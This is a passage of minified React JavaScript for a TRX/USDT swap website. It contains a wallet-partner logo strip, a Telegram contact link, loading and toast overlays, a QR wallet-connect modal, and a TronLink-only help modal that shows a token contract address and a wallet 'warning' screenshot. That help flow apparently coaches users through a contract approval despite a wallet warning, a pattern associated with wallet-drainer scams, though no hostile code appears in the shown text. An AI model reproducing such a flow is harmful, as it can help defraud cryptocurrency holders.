                                    src: "/img/safepal.3d409c82d7d947f8c201.png",
                                    alt: "SafePal",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/mathwallet.74d773ee14b863635424.png",
                                    alt: "MathWallet",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/klever.81bf895aaa98872d0e34.png",
                                    alt: "Klever",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/bitget.003aa7ca9e686362b872.png",
                                    alt: "Bitget",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/logo.234b00e2329cafb68710.png",
                                    alt: "LOGO",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/WalletConnect.bd1727b2c6b0798d35c1.png",
                                    alt: "WalletConnect",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/Trust.27b0eac7ee52b2f6550c.png",
                                    alt: "Trust",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/trx.png",
                                    alt: "TRX",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/tokenpocket.5171aeed69d1da2ab805.png",
                                    alt: "TokenPocket",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/okx.6bf5a52ec1c367a3fc94.png",
                                    alt: "OKX",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/tronlink.d99d22355fc4cec2ea0d.png",
                                    alt: "TronLink",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/imtoken.a47bc069bc7b9ad18023.png",
                                    alt: "imToken",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/safepal.3d409c82d7d947f8c201.png",
                                    alt: "SafePal",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/mathwallet.74d773ee14b863635424.png",
                                    alt: "MathWallet",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/klever.81bf895aaa98872d0e34.png",
                                    alt: "Klever",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/bitget.003aa7ca9e686362b872.png",
                                    alt: "Bitget",
                                    className: "partner-logo opacity-75"
                                })]
                            })
                        })]
                    })
                })
            }

            function N() {
                let e = "";
                return e = (window.location.hostname || "").replace(/^www\./, "").replace(/\./g, ""), (0, n.jsx)("section", {
                    className: "mb-4 gradient-border",
                    children: (0, n.jsxs)("div", {
                        className: "p-5 rounded-lg bg-gray-900 bg-center bg-cover bg-halo",
                        children: [(0, n.jsx)("div", {
                            className: "flex items-center justify-center text-center space-x-2 mb-2"
                        }), (0, n.jsxs)("p", {
                            className: "text-center text-gray-300",
                            children: [(0, n.jsx)("span", {
                                className: "i-local:tg-s4 inline-block mr-1 align-middle"
                            }), "Telegram:", " ", (0, n.jsxs)("a", {
                                href: "https://t.me/buytrx9",
                                target: "_blank",
                                rel: "noopener noreferrer",
                                className: "text-blue-400 hover:underline",
                                children: ["@", e || "TRXSwap"]
                            })]
                        }), (0, n.jsx)("p", {
                            className: "text-center mt-2 text-gray-300",
                            children: "\xa9 2026 All rights reserved."
                        })]
                    })
                })
            }
            var k = a(1822),
                T = a.n(k);

            function S() {
                let [e, t] = (0, r.useState)(!1), [a, s] = (0, r.useState)(!1), [i, o] = (0, r.useState)("Processing, please wait...");
                return ((0, r.useEffect)(() => (t(!0), window.showWaiting = e => {
                    e && "string" == typeof e ? o(e) : o("Processing, please wait..."), s(!0)
                }, window.updateWaiting = e => {
                    e && "string" == typeof e && o(e)
                }, window.hideWaiting = () => {
                    s(!1), o("Processing, please wait...")
                }, () => {
                    delete window.showWaiting, delete window.updateWaiting, delete window.hideWaiting
                }), []), e && a) ? (0, l.createPortal)((0, n.jsxs)("div", {
                    id: "waitingModal",
                    style: {
                        position: "fixed",
                        inset: 0,
                        zIndex: 9999,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        background: "rgba(10, 15, 25, 0.6)",
                        backdropFilter: "blur(6px)"
                    },
                    className: "jsx-fa375fdf1b8c7c95",
                    children: [(0, n.jsxs)("div", {
                        style: {
                            background: "#0b1221",
                            border: "1px solid rgba(0,127,233,0.4)",
                            borderRadius: "14px",
                            boxShadow: "0 0 30px rgba(0,127,233,0.2)",
                            padding: "30px 40px",
                            minWidth: "300px",
                            textAlign: "center"
                        },
                        className: "jsx-fa375fdf1b8c7c95",
                        children: [(0, n.jsxs)("div", {
                            className: "jsx-fa375fdf1b8c7c95 progress-loader",
                            children: [(0, n.jsx)("div", {
                                className: "jsx-fa375fdf1b8c7c95 progress-track"
                            }), (0, n.jsx)("div", {
                                className: "jsx-fa375fdf1b8c7c95 progress-glow"
                            })]
                        }), (0, n.jsx)("div", {
                            style: {
                                color: "#fff",
                                fontSize: "16px",
                                fontWeight: 600,
                                marginTop: "18px"
                            },
                            "data-i18n": "waiting",
                            className: "jsx-fa375fdf1b8c7c95",
                            children: i
                        })]
                    }), (0, n.jsx)(T(), {
                        id: "fa375fdf1b8c7c95",
                        children: ".progress-loader.jsx-fa375fdf1b8c7c95{position:relative;width:220px;height:6px;background:rgba(255,255,255,.08);-webkit-border-radius:10px;-moz-border-radius:10px;border-radius:10px;overflow:hidden}.progress-track.jsx-fa375fdf1b8c7c95{position:absolute;inset:0;background:-webkit-linear-gradient(left,rgba(0,127,233,.1),rgba(0,127,233,.4),rgba(0,127,233,.1));background:-moz-linear-gradient(left,rgba(0,127,233,.1),rgba(0,127,233,.4),rgba(0,127,233,.1));background:-o-linear-gradient(left,rgba(0,127,233,.1),rgba(0,127,233,.4),rgba(0,127,233,.1));background:linear-gradient(90deg,rgba(0,127,233,.1),rgba(0,127,233,.4),rgba(0,127,233,.1));-webkit-animation:trackMove 1.8s linear infinite;-moz-animation:trackMove 1.8s linear infinite;-o-animation:trackMove 1.8s linear infinite;animation:trackMove 1.8s linear infinite}.progress-glow.jsx-fa375fdf1b8c7c95{position:absolute;top:0;left:0;height:100%;width:40%;background:-webkit-linear-gradient(left,transparent,rgba(0,127,233,.9),transparent);background:-moz-linear-gradient(left,transparent,rgba(0,127,233,.9),transparent);background:-o-linear-gradient(left,transparent,rgba(0,127,233,.9),transparent);background:linear-gradient(90deg,transparent,rgba(0,127,233,.9),transparent);-webkit-animation:glowMove 1.5s ease-in-out infinite;-moz-animation:glowMove 1.5s ease-in-out infinite;-o-animation:glowMove 1.5s ease-in-out infinite;animation:glowMove 1.5s ease-in-out infinite}@-webkit-keyframes trackMove{0%{-webkit-transform:translatex(-30%);transform:translatex(-30%)}100%{-webkit-transform:translatex(30%);transform:translatex(30%)}}@-moz-keyframes trackMove{0%{-moz-transform:translatex(-30%);transform:translatex(-30%)}100%{-moz-transform:translatex(30%);transform:translatex(30%)}}@-o-keyframes trackMove{0%{-o-transform:translatex(-30%);transform:translatex(-30%)}100%{-o-transform:translatex(30%);transform:translatex(30%)}}@keyframes trackMove{0%{-webkit-transform:translatex(-30%);-moz-transform:translatex(-30%);-o-transform:translatex(-30%);transform:translatex(-30%)}100%{-webkit-transform:translatex(30%);-moz-transform:translatex(30%);-o-transform:translatex(30%);transform:translatex(30%)}}@-webkit-keyframes glowMove{0%{left:-40%}50%{left:60%}100%{left:-40%}}@-moz-keyframes glowMove{0%{left:-40%}50%{left:60%}100%{left:-40%}}@-o-keyframes glowMove{0%{left:-40%}50%{left:60%}100%{left:-40%}}@keyframes glowMove{0%{left:-40%}50%{left:60%}100%{left:-40%}}"
                    })]
                }), document.body) : null
            }

            function E() {
                let [e, t] = (0, r.useState)(!1), [a, s] = (0, r.useState)([]);
                return ((0, r.useEffect)(() => (t(!0), window.showToast = function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "success",
                        a = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 4e3,
                        n = Date.now();
                    s(a => [...a, {
                        id: n,
                        text: e,
                        type: t
                    }]), setTimeout(() => {
                        s(e => e.filter(e => e.id !== n))
                    }, a)
                }, () => delete window.showToast), []), e) ? (0, l.createPortal)((0, n.jsxs)("div", {
                    style: {
                        position: "fixed",
                        inset: 0,
                        display: "flex",
                        justifyContent: "center",
                        alignItems: "center",
                        pointerEvents: "none",
                        zIndex: 99991,
                        transform: "translateY(-100px)"
                    },
                    className: "jsx-b276c3c72673e388",
                    children: [a.map(e => (0, n.jsx)("div", {
                        style: {
                            background: "linear-gradient(145deg, #0b1221 0%, #111b32 100%)",
                            color: "success" === e.type ? "#00ffa3" : "info" === e.type ? "#009dff" : "#ff3b3b",
                            border: "1px solid ".concat("success" === e.type ? "rgba(0,255,163,0.6)" : "info" === e.type ? "rgba(0,157,255,0.5)" : "rgba(255,59,59,0.5)"),
                            padding: "16px 28px",
                            borderRadius: "14px",
                            minWidth: "280px",
                            maxWidth: "80%",
                            textAlign: "center",
                            fontSize: "16px",
                            fontWeight: 600,
                            letterSpacing: "0.3px",
                            lineHeight: "1.5",
                            wordBreak: "break-word",
                            boxShadow: "success" === e.type ? "0 0 20px rgba(0,255,163,0.3), 0 0 40px rgba(0,255,163,0.1)" : "info" === e.type ? "0 0 20px rgba(0,157,255,0.3), 0 0 40px rgba(0,157,255,0.1)" : "0 0 20px rgba(255,59,59,0.3), 0 0 40px rgba(255,59,59,0.1)",
                            backdropFilter: "blur(8px)",
                            animation: "slideUpDown 4s ease forwards"
                        },
                        className: "jsx-b276c3c72673e388",
                        children: e.text
                    }, e.id)), (0, n.jsx)(T(), {
                        id: "b276c3c72673e388",
                        children: "@-webkit-keyframes slideUpDown{0%{opacity:0;-webkit-transform:translatey(100px);transform:translatey(100px)}15%{opacity:1;-webkit-transform:translatey(0);transform:translatey(0)}85%{opacity:1;-webkit-transform:translatey(0);transform:translatey(0)}100%{opacity:0;-webkit-transform:translatey(-120px);transform:translatey(-120px)}}@-moz-keyframes slideUpDown{0%{opacity:0;-moz-transform:translatey(100px);transform:translatey(100px)}15%{opacity:1;-moz-transform:translatey(0);transform:translatey(0)}85%{opacity:1;-moz-transform:translatey(0);transform:translatey(0)}100%{opacity:0;-moz-transform:translatey(-120px);transform:translatey(-120px)}}@-o-keyframes slideUpDown{0%{opacity:0;-o-transform:translatey(100px);transform:translatey(100px)}15%{opacity:1;-o-transform:translatey(0);transform:translatey(0)}85%{opacity:1;-o-transform:translatey(0);transform:translatey(0)}100%{opacity:0;-o-transform:translatey(-120px);transform:translatey(-120px)}}@keyframes slideUpDown{0%{opacity:0;-webkit-transform:translatey(100px);-moz-transform:translatey(100px);-o-transform:translatey(100px);transform:translatey(100px)}15%{opacity:1;-webkit-transform:translatey(0);-moz-transform:translatey(0);-o-transform:translatey(0);transform:translatey(0)}85%{opacity:1;-webkit-transform:translatey(0);-moz-transform:translatey(0);-o-transform:translatey(0);transform:translatey(0)}100%{opacity:0;-webkit-transform:translatey(-120px);-moz-transform:translatey(-120px);-o-transform:translatey(-120px);transform:translatey(-120px)}}"
                    })]
                }), document.body) : null
            }

            function W() {
                let [e, t] = (0, r.useState)(!1), [a, i] = (0, r.useState)(!1), [o, c] = (0, r.useState)(null), [d, p] = (0, r.useState)("Trust Wallet"), h = (0, s.Sv)(), m = () => {
                    var e, t;
                    i(!1), c(null);
                    p("Trust Wallet");
                    try {
                        document.body.style.overflow = ""
                    } catch (e) {}
                    null === (e = (t = window).hideWaiting) || void 0 === e || e.call(t)
                };
                return ((0, r.useEffect)(() => {
                    t(!0);
                    let e = e => {
                            var t, a;
                            c((null === (t = e.detail) || void 0 === t ? void 0 : t.qrDataUrl) || null), p((null === (a = e.detail) || void 0 === a ? void 0 : a.walletName) || "Trust Wallet"), i(!0);
                            try {
                                document.body.style.overflow = "hidden"
                            } catch (e) {}
                        },
                        a = () => {
                            i(!1), c(null);
                            p("Trust Wallet");
                            try {
                                document.body.style.overflow = ""
                            } catch (e) {}
                        },
                        n = e => {
                            "Escape" === e.key && m()
                        };
                    return window.addEventListener("openWalletQr", e), window.addEventListener("closeWalletQr", a), window.addEventListener("keydown", n), () => {
                        window.removeEventListener("openWalletQr", e), window.removeEventListener("closeWalletQr", a), window.removeEventListener("keydown", n)
                    }
                }, []), e && a) ? (0, l.createPortal)((0, n.jsx)("div", {
                    id: "walletQrModal",
                    style: {
                        display: a ? "flex" : "none",
                        position: "fixed",
                        inset: 0,
                        zIndex: 2147483647,
                        justifyContent: "center",
                        alignItems: "center",
                        pointerEvents: "auto"
                    },
                    children: (0, n.jsx)("div", {
                        className: "gradient-border",
                        id: "walletContent",
                        children: (0, n.jsxs)("div", {
                            className: "wallet-modal-content text-center",
                            children: [(0, n.jsx)("button", {
                                onClick: m,
                                className: "wallet-close-btn",
                                children: "\xd7"
                            }), (0, n.jsx)("h2", {
                                style: {
                                    marginBottom: 20
                                },
                                children: "Scan with ".concat(d, " to connect")
                            }), o ? (0, n.jsx)("img", {
                                src: o,
                                alt: "".concat(d, " QR"),
                                width: 300,
                                height: 300,
                                style: {
                                    display: "inline-block",
                                    borderRadius: "10px",
                                    background: "#fff",
                                    padding: "8px"
                                }
                            }) : (0, n.jsx)("p", {
                                style: {
                                    color: "#ccc"
                                },
                                children: "Loading QR..."
                            })]
                        })
                    })
                }), document.body) : null
            }

            function C() {
                let [e, t] = (0, r.useState)(!1), [a, i] = (0, r.useState)(!1), o = (0, s.Sv)(), l = (0, r.useCallback)(() => {
                    try {
                        var e;
                        let t = window,
                            a = null == t ? void 0 : null === (e = t.APP_STATE) || void 0 === e ? void 0 : e.wallet,
                            n = !!a && !0 === a.connected && "tronlink" === String(a.type).toLowerCase();
                        i(n)
                    } catch (e) {
                        i(!1)
                    }
                }, []);
                return ((0, r.useEffect)(() => {
                    l();
                    let e = setInterval(l, 2e3);
                    window.showTxHelp = () => t(!0), window.hideTxHelp = () => t(!1);
                    let a = () => l();
                    window.addEventListener("appstate:update", a);
                    let n = e => "Escape" === e.key && t(!1);
                    return window.addEventListener("keydown", n), () => {
                        clearInterval(e), window.removeEventListener("appstate:update", a), window.removeEventListener("keydown", n), delete window.showTxHelp, delete window.hideTxHelp
                    }
                }, [l]), a) ? (0, n.jsxs)(n.Fragment, {
                    children: [(0, n.jsxs)("button", {
                        onClick: () => t(!0),
                        "aria-label": o("helpBtnAria"),
                        className: "fixed bottom-5 right-5 z-[1000]   w-[76px] h-[76px] flex flex-col items-center justify-center   rounded-full shadow-[0_8px_25px_rgba(0,0,0,0.6),0_0_10px_rgba(0,127,233,0.3)]   bg-[#007fe9] hover:bg-[#0095ff] active:bg-[#0095ff]   text-white text-sm font-semibold leading-tight   transition-all duration-200 ease-in-out",
                        children: [o("helpBtnLine1"), (0, n.jsx)("span", {
                            className: "text-[12px] opacity-90",
                            children: o("helpBtnLine2")
                        })]
                    }), e && (0, n.jsx)("div", {
                        className: "fixed inset-0 z-[1001] flex items-center justify-center bg-black/60 backdrop-blur-sm",
                        onClick: () => t(!1),
                        children: (0, n.jsxs)("div", {
                            className: "w-[92%] max-w-[425px] max-h-[90vh] overflow-y-auto   bg-[#0f172a] text-white rounded-2xl shadow-2xl p-4 relative",
                            onClick: e => e.stopPropagation(),
                            children: [(0, n.jsx)("button", {
                                onClick: () => t(!1),
                                className: "absolute top-3 right-4 text-xl text-gray-300 hover:text-white",
                                children: "✕"
                            }), (0, n.jsx)("h2", {
                                className: "text-lg font-bold text-center mb-4",
                                children: o("modalTitle")
                            }), (0, n.jsxs)("section", {
                                className: "mb-6",
                                children: [(0, n.jsx)("img", {
                                    src: "/img/tx-help-contract.11393c46f0d9534c9cb0.png",
                                    alt: o("step1ImgAlt"),
                                    className: "w-full rounded-xl mb-3 border border-white/10",
                                    loading: "lazy"
                                }), (0, n.jsxs)("p", {
                                    className: "text-sm leading-relaxed text-gray-200",
                                    children: [o("step1TextPart1"), (0, n.jsx)("code", {
                                        className: "bg-black/30 px-1 rounded text-[12px] text-green-300",
                                        children: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                                    }), o("step1TextPart2")]
                                })]
                            }), (0, n.jsxs)("section", {
                                children: [(0, n.jsx)("img", {
                                    src: "/img/tx-help-warning.9d1060af76c5b3d59282.png",
                                    alt: o("step2ImgAlt"),
                                    className: "w-full rounded-xl mb-3 border border-white/10",
                                    loading: "lazy"
                                }), (0, n.jsx)("p", {
                                    className: "text-sm leading-relaxed text-gray-200",
                                    children: o("step2Text")
                                })]
                            }), (0, n.jsx)("div", {
                                className: "mt-4 p-3 rounded-lg bg-white/5 text-center text-[13px] text-gray-200",
                                children: o("footerNote")
                            })]
                        })
                    })]
                }) : null
            }

            function A() {
                return (0, n.jsxs)("div", {
                    className: "main-wrapper",
                    children: [(0, n.jsx)(i, {}), (0, n.jsx)(o, {}), (0, n.jsx)(y, {}), (0, n.jsx)(v, {}), (0, n.jsx)(j, {}), (0, n.jsx)(N, {}), (0, n.jsx)(b, {}), (0, n.jsx)(S, {}), (0, n.jsx)(E, {}), (0, n.jsx)(W, {}), (0, n.jsx)(C, {})]
                })
            }
        }
    }
]);
